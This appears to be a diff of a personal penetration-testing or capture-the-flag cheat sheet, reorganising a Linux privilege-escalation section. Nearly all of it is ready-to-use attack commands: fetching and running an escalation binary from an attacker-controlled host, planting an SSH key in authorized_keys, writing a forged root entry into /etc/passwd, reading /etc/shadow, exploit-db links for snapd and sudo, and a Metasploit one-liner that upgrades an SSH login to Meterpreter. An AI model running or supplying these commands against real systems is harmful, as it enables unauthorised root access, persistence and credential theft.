@@ -729,31 +729,50 @@ c=./traitor;curl $MYIP:8888/linux/$c -O;chmod +x $c;$c -a
 scp -r ~/Upload $USERNAME@$TARGET:~
 
 [*] Privilege Escalation
-adduser temp --uid 1047
-usermod -aG sudo temp
++---------- Exploits ----------+
+snapd_2.37          https://www.exploit-db.com/exploits/46361
+sudo_1.6.9.p18      https://www.exploit-db.com/exploits/7129
 
++---------- SUID Files ----------+
 find / -perm /4000 2>/dev/null | xargs ls -la
-sudo -l
-netstat -tuln
-cat /etc/crontab
-ls -la /opt
-grep -r -E 'conf' /var/www
-cd ~/.ssh; ls -la
 
++---------- Sudo Permissions ----------+
+sudo -l
+
++---------- Cron Jobs ----------+
+cat /etc/crontab
+
++---------- Custom Installed Apps ----------+
+ls -la /opt
+
++---------- Network Listening ----------+
+netstat -tuln
+
++---------- SSH Files ----------+
+cd ~/.ssh; ls -la
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze<REDACTED>' > ~/.ssh/authorized_keys
+
++---------- Config Files ----------+
+grep -r -E 'conf' /var/www
+
++---------- /etc/passwd Permission ----------+
 ls -la /etc/passwd
 nano /etc/passwd
 mkpasswd -m descrypt 'password'
 piS1wHGBkJ3z2
 root:piS1wHGBkJ3z2:0:0:root:/root:/usr/bin/bash
-su root
+
++---------- Switching Users ----------+
+su root -p
 password
 
++---------- Finding Files ----------+
 find / -name '*secret0*' -readable 2>/dev/null | xargs ls -la
 find / -name 'root.txt' -readable -exec echo {} \; -exec cat {} \; 2>/dev/null
-cat /etc/passwd | grep -vE 'nologin' | cut -d ':' -f '1'
+
++---------- Looking at /etc/shadow ----------+
 cat /etc/shadow
 
-su $USERNAME --preserve-environment
 
 [*] Meterpreter
 msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/bind_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/bind_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run'
